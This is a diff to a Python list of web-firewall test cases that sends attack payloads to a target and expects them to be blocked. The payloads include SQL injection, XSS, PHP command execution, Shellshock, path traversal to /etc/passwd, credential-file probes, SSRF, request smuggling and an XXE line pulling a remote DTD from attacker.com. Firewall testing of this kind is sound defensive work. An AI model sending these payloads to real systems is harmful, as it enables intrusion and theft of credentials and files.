@@ -267,14 +267,6 @@ test_cases = [
     ("IDOR", f"{TARGET_URL}/user/..%2fetc%2fpasswd", "IDOR (Level 7) - Path Traversal in ID", 403, None, None),
     ("IDOR", f"{TARGET_URL}/admin/user/1", "IDOR (Level 8) - Different resource", 403, None, None),
 
-    #Business Logic Vulnerabilities
-    ("Business Logic", f"{TARGET_URL}/buy?item=1&quantity=1", "Business Logic (Level 1) - Basic Purchase", 403, None, None),
-    ("Business Logic", f"{TARGET_URL}/buy?item=1&quantity=-1", "Business Logic (Level 2) - Negative Quantity", 403, None, None),
-    ("Business Logic", f"{TARGET_URL}/transfer?from=user1&to=user2&amount=100", "Business Logic (Level 3) - Funds Transfer", 403, None, None),
-    ("Business Logic", f"{TARGET_URL}/transfer?from=user1&to=user2&amount=-100", "Business Logic (Level 4) - Negative Transfer Amount", 403, None, None),
-    ("Business Logic", f"{TARGET_URL}/?discount_code=DISCOUNT50", "Business Logic (Level 5) - Discount Code Abuse", 403, None, None),
-    ("Business Logic", f"{TARGET_URL}/?promocode=TEST&price=1", "Business Logic (Level 6) - Price Manipulation", 403, None, None),
-
     # Clickjacking Tests
     ("Clickjacking", f"{TARGET_URL}/", "Clickjacking (Level 1) - Basic Iframe Test", 200, None, "<iframe src=\"{TARGET_URL}\"></iframe>"),
     ("Clickjacking", f"{TARGET_URL}/", "Clickjacking (Level 2) - Double Iframe Test", 200, None, "<iframe src=\"{TARGET_URL}\"><iframe src=\"{TARGET_URL}\"></iframe></iframe>"),
@@ -333,6 +325,161 @@ test_cases = [
     # GraphQL Injection
     ("GraphQL", f"{TARGET_URL}/graphql", "GraphQL (Level 1) - Basic Query Injection", 403, {"Content-Type": "application/json"}, '{"query":"{ user(id:1) { username, password } }"}'),
     ("GraphQL", f"{TARGET_URL}/graphql", "GraphQL (Level 2) - Injection via Variables", 403, {"Content-Type": "application/json"}, '{"query":"query getUser($id:Int){ user(id:$id){ username, password }}","variables":{"id":1}}'),
+
+    # More SQL Injection (SQLi) Tests
+    ("SQLi", f"{TARGET_URL}/?q=SLEEP(5)", "SQLi (Level 25) - Time-Based Blind", 403, None, None),
+    ("SQLi", f"{TARGET_URL}/?q=1 AND benchmark(5000000,MD5('A'))--", "SQLi (Level 26) - MySQL Time-Based", 403, None, None),
+    ("SQLi", f"{TARGET_URL}/?q=CAST(1 AS INT)", "SQLi (Level 27) - Data Type Conversion", 403, None, None),
+    ("SQLi", f"{TARGET_URL}/?q=CONVERT(INT,1)", "SQLi (Level 28) - Data Type Conversion (MSSQL)", 403, None, None),
+    ("SQLi", f"{TARGET_URL}/?q=EXTRACTVALUE(xmltype('<x><y>1</y></x>'),'/x/y')", "SQLi (Level 29) - Error-Based (XML)", 403, None, None),
+    ("SQLi", f"{TARGET_URL}/?q=CTXSYS.DRITHSX.SN(user_tables,'1=1')", "SQLi (Level 30) - Oracle Error-Based", 403, None, None),
+    ("SQLi", f"{TARGET_URL}/?q=1'; SHOW DATABASES;--", "SQLi (Level 31) - MySQL Stacked Query", 403, None, None),
+    ("SQLi", f"{TARGET_URL}/?q=1'; EXEC sp_databases;--", "SQLi (Level 32) - MSSQL Stacked Query", 403, None, None),
+    ("SQLi", f"{TARGET_URL}/?q=CREATE USER testuser WITH PASSWORD 'password';", "SQLi (Level 33) - PostgreSQL Stacked Query", 403, None, None),
+    ("SQLi", f"{TARGET_URL}/?q=SELECT CASE WHEN (1=1) THEN to_char(current_timestamp) ELSE '' END", "SQLi (Level 34) - PostgreSQL Conditional", 403, None, None),
+    ("SQLi", f"{TARGET_URL}/?q=SELECT utl_inaddr.get_host_name('localhost') FROM dual", "SQLi (Level 35) - Oracle Function Call", 403, None, None),
+    ("SQLi", f"{TARGET_URL}/?q=SELECT top 1 name FROM sys.databases", "SQLi (Level 36) - MSSQL Information Schema", 403, None, None),
+    ("SQLi", f"{TARGET_URL}/?q=SELECT table_name FROM information_schema.tables", "SQLi (Level 37) - MySQL Information Schema", 403, None, None),
+    ("SQLi", f"{TARGET_URL}/", "SQLi (Header Level 4) - User-Agent Injection", 403, {"User-Agent": "test' OR '1'='1"}, None),
+
+    # More Cross-Site Scripting (XSS) Tests
+    ("XSS", f"{TARGET_URL}/?x=<details open ontoggle=\"alert(1)\">", "XSS (Level 20) - Details Ontoggle without quotes", 403, None, None),
+    ("XSS", f"{TARGET_URL}/?x=<iframe/src=\"data:text/html,<script>alert(1)</script>\">", "XSS (Level 21) - Iframe Data URI", 403, None, None),
+    ("XSS", f"{TARGET_URL}/?x=<object data=\"javascript:alert(1)\">", "XSS (Level 22) - Object Tag JavaScript Protocol", 403, None, None),
+    ("XSS", f"{TARGET_URL}/?x=<b οnclick=alert(1)>ClickMe</b>", "XSS (Level 23) - B Tag Onclick", 403, None, None),
+    ("XSS", f"{TARGET_URL}/?x=<meta http-equiv=\"refresh\" content=\"0;url=javascript:alert(1)\">", "XSS (Level 25) - Meta Refresh", 403, None, None),
+    ("XSS", f"{TARGET_URL}/?x=<!--><script>alert(1)</script>", "XSS (Level 26) - HTML Comment Bypass", 403, None, None),
+    ("XSS", f"{TARGET_URL}/?x=<svg><script>alert(1)</script></svg>", "XSS (Level 27) - SVG Script Tag", 403, None, None),
+    ("XSS", f"{TARGET_URL}/#<script>alert(1)</script>", "XSS (Level 28) - Hash Injection", 403, None, None),
+    ("XSS", f"{TARGET_URL}/?x=<plaintext/οnmouseover=alert(1)>test", "XSS (Level 29) - plaintext tag", 403, None, None),
+    ("XSS", f"{TARGET_URL}/", "XSS (Header Level 3) - Referer Injection", 403, {"Referer": "<script>alert(1)</script>"}, None),
+    ("XSS", f"{TARGET_URL}/", "XSS (Cookie Level 3) - Double Quotes", 403, {"Cookie": 'xss="<script>alert(1)</script>"'}, None),
+    ("XSS", f"{TARGET_URL}", "XSS (Body Level 3) - Encoded SVG", 403, None, "<svg onload=alert(1)>"),
+
+    # More Remote Code Execution (RCE) Tests
+    ("RCE", f"{TARGET_URL}/?cmd=echo system('whoami')", "RCE (Level 16) - Echo with System", 403, None, None),
+    ("RCE", f"{TARGET_URL}/?cmd=passthru('whoami')", "RCE (Level 17) - passthru Command", 403, None, None),
+    ("RCE", f"{TARGET_URL}/?cmd=shell_exec('whoami')", "RCE (Level 18) - shell_exec Command", 403, None, None),
+    ("RCE", f"{TARGET_URL}/?cmd=反引号whoami反引号", "RCE (Level 19) - Chinese Backticks", 403, None, None),
+    ("RCE", f"{TARGET_URL}/?cmd=popen('whoami', 'r')", "RCE (Level 20) - popen Command", 403, None, None),
+    ("RCE", f"{TARGET_URL}/?cmd=proc_open('whoami', array(), $pipes)", "RCE (Level 21) - proc_open Command", 403, None, None),
+    ("RCE", f"{TARGET_URL}/?cmd=assert($_GET['x'])&x=phpinfo();", "RCE (Level 22) - Assert with GET", 403, None, None),
+    ("RCE", f"{TARGET_URL}/?cmd=eval($_POST['y'])", "RCE (Level 23) - Eval with POST", 403, None, "y=phpinfo();"),
+    ("RCE", f"{TARGET_URL}/?cmd=include($_GET['file'])&file=/etc/passwd", "RCE (Level 24) - Include with GET", 403, None, None),
+    ("RCE", f"{TARGET_URL}/?cmd=require($_POST['file'])", "RCE (Level 25) - Require with POST", 403, None, "file=/etc/passwd"),
+    ("RCE", f"{TARGET_URL}/", "RCE (Header Level 3) - User-Agent Command Injection", 403, {"User-Agent": "() { :; }; /usr/bin/whoami"}, None),
+
+    # More Path Traversal Tests
+    ("Path Traversal", f"{TARGET_URL}/....//....//etc/passwd", "Path Traversal (Level 15) - Mixed Obfuscation", 403, None, None),
+    ("Path Traversal", f"{TARGET_URL}/..%00/etc/passwd", "Path Traversal (Level 16) - Null Byte Injection", 403, None, None),
+    ("Path Traversal", f"{TARGET_URL}/%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd", "Path Traversal (Level 17) - Percent Encoding", 403, None, None),
+    ("Path Traversal", f"{TARGET_URL}/%252e%252e%252f%252e%252e%252fetc%252fpasswd", "Path Traversal (Level 18) - Double Percent Encoding", 403, None, None),
+    ("Path Traversal", f"{TARGET_URL}/..\\..\\..\\etc\\passwd", "Path Traversal (Level 19) - Windows Style", 403, None, None),
+    ("Path Traversal", f"{TARGET_URL}/", "Path Traversal (Header Level 2) - Custom Header Injection", 403, {"X-File-Path": "../../../etc/passwd"}, None),
+    ("Path Traversal", f"{TARGET_URL}/", "Path Traversal (Cookie Level 2) - Double Encoded Cookie", 403, {"Cookie": "file=%252e%252e%252f%252e%252e%252fetc%252fpasswd"}, None),
+
+    # More Header Injection Tests
+    ("Header", f"{TARGET_URL}/", "Header (Level 11) - Content-Disposition Injection", 403, {"Content-Disposition": "attachment; filename=\"test.html\r\nContent-Type: text/html\""}, None),
+    ("Header", f"{TARGET_URL}/", "Header (Level 12) - Transfer-Encoding Manipulation", 403, {"Transfer-Encoding": "chunked"}, "0\r\n\r\n"),
+    ("Header", f"{TARGET_URL}/", "Header (Level 13) - Connection Close", 403, {"Connection": "close"}, None),
+    ("Header", f"{TARGET_URL}/", "Header (Level 14) - Upgrade Insecure Requests", 403, {"Upgrade-Insecure-Requests": "1"}, None),
+    ("Header", f"{TARGET_URL}/", "Header (Level 15) - X-Original-URL Injection", 403, {"X-Original-URL": "/../../../etc/passwd"}, None),
+
+    # More Protocol-Specific Tests
+    ("Protocol", f"{TARGET_URL}/.aws/credentials", "Protocol (Level 11) - AWS Credentials", 403, None, None),
+    ("Protocol", f"{TARGET_URL}/appsettings.json", "Protocol (Level 12) - appsettings.json", 403, None, None),
+    ("Protocol", f"{TARGET_URL}/docker-compose.yml", "Protocol (Level 13) - docker-compose.yml", 403, None, None),
+    ("Protocol", f"{TARGET_URL}/build.gradle", "Protocol (Level 14) - build.gradle", 403, None, None),
+    ("Protocol", f"{TARGET_URL}/pom.xml", "Protocol (Level 15) - pom.xml", 403, None, None),
+    ("Protocol", f"{TARGET_URL}/.git/config", "Protocol (Level 16) - .git/config", 403, None, None),
+    ("Protocol", f"{TARGET_URL}/.hg/hgrc", "Protocol (Level 17) - .hg/hgrc", 403, None, None),
+    ("Protocol", f"{TARGET_URL}/sitemap.xml", "Protocol (Level 18) - sitemap.xml", 403, None, None),
+    ("Protocol", f"{TARGET_URL}/crossdomain.xml", "Protocol (Level 19) - crossdomain.xml", 403, None, None),
+    ("Protocol", f"{TARGET_URL}/clientaccesspolicy.xml", "Protocol (Level 20) - clientaccesspolicy.xml", 403, None, None),
+
+    # More Scanner Detection Tests
+    ("Scanner", f"{TARGET_URL}/", "Scanner (Level 13) - Vega User-Agent", 403, {"User-Agent": "Vega"}, None),
+    ("Scanner", f"{TARGET_URL}/", "Scanner (Level 14) - Skipfish Generic", 403, {"User-Agent": "Mozilla/5.0 (compatible; NoName/1.0; +http://example.com)"}, None),
+    ("Scanner", f"{TARGET_URL}/", "Scanner (Level 15) - WPScan User-Agent", 403, {"User-Agent": "WPScan"}, None),
+    ("Scanner", f"{TARGET_URL}/", "Scanner (Level 16) - DirBuster User-Agent", 403, {"User-Agent": "DirBuster"}, None),
+    ("Scanner", f"{TARGET_URL}/", "Scanner (Level 17) - GoSpider User-Agent", 403, {"User-Agent": "Go-http-client"}, None),
+    ("Scanner", f"{TARGET_URL}/", "Scanner (Level 18) - GxSpider User-Agent", 403, {"User-Agent": "GxSpider"}, None),
+
+    # More Insecure Deserialization Tests
+    ("Insecure Deserialization", f"{TARGET_URL}/?data=Tzo...base64...", "Insecure Deserialization (Level 3) - PHP Object", 403, None, None),
+    ("Insecure Deserialization", f"{TARGET_URL}/", "Insecure Deserialization (Header Level 3) - PHP Object in Header", 403, {"X-Serialized-Data": "Tzo...base64..."}, None),
+    ("Insecure Deserialization", f"{TARGET_URL}/", "Insecure Deserialization (Cookie Level 3) - PHP Object in Cookie", 403, {"Cookie": "session=Tzo...base64..."}, None),
+
+    # More Server-Side Request Forgery (SSRF) Tests
+    ("SSRF", f"{TARGET_URL}/?url=http://[::1]", "SSRF (Level 6) - IPv6 Localhost", 403, None, None),
+    ("SSRF", f"{TARGET_URL}/?url=http://0", "SSRF (Level 7) - Integer IP Address", 403, None, None),
+    ("SSRF", f"{TARGET_URL}/?url=http://127.1", "SSRF (Level 8) - Shortened IP Address", 403, None, None),
+    ("SSRF", f"{TARGET_URL}/?url=https://example.com@127.0.0.1", "SSRF (Level 9) - Credential in URL", 403, None, None),
+    ("SSRF", f"{TARGET_URL}/", "SSRF (Header Level 3) - X-Forwarded-For SSRF", 403, {"X-Forwarded-For": "http://127.0.0.1"}, None),
+
+    # More XML External Entity (XXE) Injection Tests
+    ("XXE", f"{TARGET_URL}/?xml=<!DOCTYPE foo [<!ENTITY % remote SYSTEM 'http://attacker.com/evil.dtd'>%remote;]><bar>&exfil;</bar>", "XXE (Level 5) - Remote DTD with Parameter Entity", 403, None, None),
+    ("XXE", f"{TARGET_URL}/", "XXE (Header Level 3) - SVG in Header", 403, {"Content-Type": "image/svg+xml"}, "<!DOCTYPE svg PUBLIC \"-//W3C//DTD SVG 1.0//EN\" \"http://www.w3.org/TR/2001/REC-SVG-20010904/DTD/svg10.dtd\"[<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><svg><text>&xxe;</text></svg>"),
+    ("XXE", f"{TARGET_URL}/", "XXE (Body Level 3) - SVG in Body", 403, None, "<!DOCTYPE svg PUBLIC \"-//W3C//DTD SVG 1.0//EN\" \"http://www.w3.org/TR/2001/REC-SVG-20010904/DTD/svg10.dtd\"[<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><svg><text>&xxe;</text></svg>"),
+
+    # More HTTP Request Smuggling
+    ("HTTP Request Smuggling", f"{TARGET_URL}/", "HTTP Request Smuggling (Level 4) - TE: chunked, TE: identity", 403, {"Transfer-Encoding": "chunked, identity"}, "0\r\n\r\n"),
+    ("HTTP Request Smuggling", f"{TARGET_URL}/", "HTTP Request Smuggling (Level 5) - Obfuscated TE", 403, {"Transfer-Encoding ": "chunked"}, "0\r\n\r\n"),
+    ("HTTP Request Smuggling", f"{TARGET_URL}/", "HTTP Request Smuggling (Header Level 3) - Mixed Case TE", 403, {"Transfer-Encoding": "Chunked", "Content-Length": "10"}, "0\r\n\r\n"),
+    ("HTTP Request Smuggling", f"{TARGET_URL}/", "HTTP Request Smuggling (Body Level 3) - Extra Content", 403, None, "0\r\n\r\nPOST / HTTP/1.1\r\nHost: target\r\nContent-Length: 10\r\n\r\ndata"),
+
+    # More HTTP Response Splitting
+    ("HTTP Response Splitting", f"{TARGET_URL}/?header=Set-Cookie: test=malicious%0d%0aContent-Type: text/html", "HTTP Response Splitting (Level 3) - Set-Cookie Injection", 403, None, None),
+    ("HTTP Response Splitting", f"{TARGET_URL}/", "HTTP Response Splitting (Header Level 3) - Location Injection", 403, {"Location": "https://evil.com%0d%0aContent-Type: text/html"}, None),
+    ("HTTP Response Splitting", f"{TARGET_URL}/", "HTTP Response Splitting (Cookie Level 3) - Multiple Cookies", 403, {"Cookie": "test1=value1; test2=malicious%0d%0aContent-Type: text/html"}, None),
+
+    # More Insecure Direct Object References (IDOR)
+    ("IDOR", f"{TARGET_URL}/image/1.jpg", "IDOR (Level 9) - Accessing Image", 403, None, None),
+    ("IDOR", f"{TARGET_URL}/download/report_123.pdf", "IDOR (Level 10) - Downloading Report", 403, None, None),
+    ("IDOR", f"{TARGET_URL}/view_invoice?id=ABC", "IDOR (Level 11) - Alphanumeric ID", 403, None, None),
+    ("IDOR", f"{TARGET_URL}/settings/profile.json", "IDOR (Level 12) - Accessing JSON Data", 403, None, None),
+
+    # More Clickjacking Tests
+    ("Clickjacking", f"{TARGET_URL}/", "Clickjacking (Level 5) - Form Tag Test", 200, None, "<form action=\"{TARGET_URL}\"><input type=\"submit\" value=\"Click Me\"></form>"),
+    ("Clickjacking", f"{TARGET_URL}/", "Clickjacking (Level 6) - Base Tag Test", 200, None, "<base href=\"{TARGET_URL}\"><a href=\"\">Click Me</a>"),
+
+    # More Cross-Site Request Forgery (CSRF) Tests
+    ("CSRF", f"{TARGET_URL}/transfer.php", "CSRF (Level 5) - GET with Array Parameter", 200, None, "<img src='{TARGET_URL}/transfer.php?amounts[]=100&to=victim'>"),
+    ("CSRF", f"{TARGET_URL}/change_settings", "CSRF (Level 6) - POST with XML", 200, {'Content-Type': 'application/xml'}, '<settings><email>attacker@example.com</email></settings>'),
+    ("CSRF", f"{TARGET_URL}/upload_avatar", "CSRF (Level 7) - File Upload (Without Token)", 200, {'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW'}, '------WebKitFormBoundary7MA4YWxkTrZu0gW\r\nContent-Disposition: form-data; name="avatar"; filename="evil.jpg"\r\nContent-Type: image/jpeg\r\n\r\nFAKE_IMAGE_CONTENT\r\n------WebKitFormBoundary7MA4YWxkTrZu0gW--\r\n'),
+
+    # More Mass Assignment Tests
+    ("Mass Assignment", f"{TARGET_URL}/settings/update", "Mass Assignment (Level 3) - Nested Object Update", 200, {"Content-Type": "application/json"}, '{"profile": {"isAdmin": true}, "username": "test"}'),
+    ("Mass Assignment", f"{TARGET_URL}/settings/update", "Mass Assignment (Level 4) - Array Update", 200, {"Content-Type": "application/json"}, '{"permissions": ["admin", "delete"], "username": "test"}'),
+
+    # More NoSQL Injection Tests
+    ("NoSQL Injection", f"{TARGET_URL}/?search[$gt]=1", "NoSQLi (Level 5) - MongoDB $gt with Number", 403, None, None),
+    ("NoSQL Injection", f"{TARGET_URL}/?search[$where]= '1' == '1'", "NoSQLi (Level 6) - MongoDB $where Operator", 403, None, None),
+    ("NoSQL Injection", f"{TARGET_URL}/", "NoSQLi (Header Level 2) - Complex Injection", 403, {"X-Search-Param": '{"$gt": 1}'}, None),
+
+    # More XPath Injection Tests
+    ("XPath Injection", f"{TARGET_URL}/?user=//users/user[username='admin' and password='password']", "XPath (Level 4) - Credential Check", 403, None, None),
+    ("XPath Injection", f"{TARGET_URL}/", "XPath (Header Level 2) - Complex Query", 403, {"X-User-Search": "//users/user[contains(name(),'adm')]"}, None),
+
+    # More LDAP Injection Tests
+    ("LDAP Injection", f"{TARGET_URL}/?user=(|(uid=admin)(cn=*))", "LDAP (Level 4) - OR Bypass", 403, None, None),
+    ("LDAP Injection", f"{TARGET_URL}/", "LDAP (Header Level 2) - Complex Filter", 403, {"X-User-Filter": "(objectClass=*)(uid=admin)"}, None),
+
+    # More XML Injection (Other than XXE)
+    ("XML Injection", f"{TARGET_URL}/?data=<user><name>attacker</name><isAdmin>true</isAdmin></user>", "XMLi (Level 3) - Privilege Escalation", 403, None, None),
+    ("XML Injection", f"{TARGET_URL}/", "XMLi (Header Level 2) - Injecting Attributes", 403, {"Content-Type": "application/xml"}, "<user name=\"test\" isAdmin=\"true\"/>"),
+
+    # More File upload
+    ("File Upload", f"{TARGET_URL}/upload.php", "File Upload (Level 3) - SVG with embedded script", 403, None, "<svg><script>alert(1)</script></svg>"),
+    ("File Upload", f"{TARGET_URL}/upload.php", "File Upload (Level 4) - .htaccess to allow PHP in images", 403, None, "FAKE_HTACCESS_CONTENT"),
+
+    # More JWT
+    ("JWT", f"{TARGET_URL}/api", "JWT (Level 3) - Algorithm Confusion with JWK", 403, {"Authorization": "Bearer tampered_jwt"}, None),
+    ("JWT", f"{TARGET_URL}/api", "JWT (Level 4) - Missing Signature", 403, {"Authorization": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ."}, None),
+
+    # More GraphQL Injection
+    ("GraphQL", f"{TARGET_URL}/graphql", "GraphQL (Level 3) - Introspection Query", 403, {"Content-Type": "application/json"}, '{"query":"{ __schema { types { name fields { name } } } }"}'),
+    ("GraphQL", f"{TARGET_URL}/graphql", "GraphQL (Level 4) - Batch Querying", 403, {"Content-Type": "application/json"}, '[{"query":"{ user(id:1) { username } }"},{"query":"{ user(id:2) { username } }"}]'),
 
     # Valid Requests
     ("Valid", f"{TARGET_URL}/", "Valid (Level 1) - Homepage", 200, None, None),
